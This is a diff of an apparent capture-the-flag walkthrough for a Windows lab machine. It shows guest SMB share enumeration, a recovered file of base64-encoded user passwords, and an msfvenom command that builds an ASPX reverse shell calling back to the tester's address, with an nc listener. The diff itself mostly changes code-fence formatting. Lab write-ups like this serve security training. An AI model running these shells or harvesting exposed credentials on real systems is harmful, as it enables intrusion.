@@ -52,13 +52,13 @@ crackmapexec smb 10.10.97.109 -u "gust" -p "" --shares
 
 - Found `passowrds.txt` then create smb directory and move it there.
 
-```bash
+``` bash
 crackmapexec smb 10.10.176.144 -u "gust" -p "" -M spider_plus
 smbclient //10.10.176.144/nt4wrksv -U ""
 ```
 
 
-```passowrd.txt
+``` TXT
 [User Passwords - Encoded]
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
@@ -74,9 +74,11 @@ Bill:Juw4nnaM4n420696969!$$$
 
 1. Try bill account on `evil-winrm` and can not access. Also try on RDP and failed. So it must be fake!
 2. found that port 49663 has also a web server and run `gobsuter` to enumerate directories and found one with same `smb` share name! 
+
 - http://10.10.247.115:49663/nt4wrksv/shell.aspx
 
-```bash
+
+``` bash
 
 msfvenom -p windows/x64/shell_reverse_tcp LPORT=9001 LHOST=10.9.78.51  -f aspx -o shell.aspx 
 
@@ -88,7 +90,7 @@ sudo rlwrap nc -lnvp 9001
 
 ## Local Enumeration 
 
-```powershell
+``` powershell
 
 whoami /all
 
